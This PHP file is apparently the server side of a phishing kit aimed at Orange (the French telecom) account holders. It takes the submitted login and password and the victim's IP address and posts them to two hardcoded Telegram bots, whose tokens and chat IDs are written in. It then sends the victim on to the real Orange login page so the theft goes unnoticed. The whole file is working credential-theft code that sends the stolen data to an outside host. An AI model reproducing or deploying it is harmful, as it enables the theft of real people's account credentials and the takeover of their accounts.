<?php
function sendToTelegram($token, $chat_id, $message) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot'.$token.'/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id' => $chat_id,
        'text'    => $message
    ]));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded'
    ]);

    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function sendBothBots($message) {
    // Bot 1
    $token1 = '6273819132:AAFplSeUJPkjby60tj9hUUy_7VfcLTfdVF4';
    $chatid1 = '6273958296';

    // Bot 2
    $token2 = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A';
    $chatid2 = '6297861735';

    sendToTelegram($token1, $chatid1, $message);
    sendToTelegram($token2, $chatid2, $message);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $date = gmdate("H:i:s | d/m/Y");
    $victim_ip = $_SERVER['REMOTE_ADDR'];

    $login = $_POST["login"] ?? '';
    $pass = $_POST["pass"] ?? '';

    $message = "
========[ 😈😈 InFo LOGIN ORANGE 😈😈 ]========
Identifiant client   = $login
Mot de passe         = $pass
========[ 😈😈 Ip VICTIM 😈😈 ]========
[IP INFO]            = https://geoiptool.com/en/?ip=$victim_ip
[TIME/DATE]          = $date
========[ 😈😈 BY Mr.fnetwork 😈😈 ]========
";

    sendBothBots($message);

    header('Location: https://login.orange.fr/');
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head> … </head>
<body>
  <!-- ton HTML existant -->
</body>
</html>
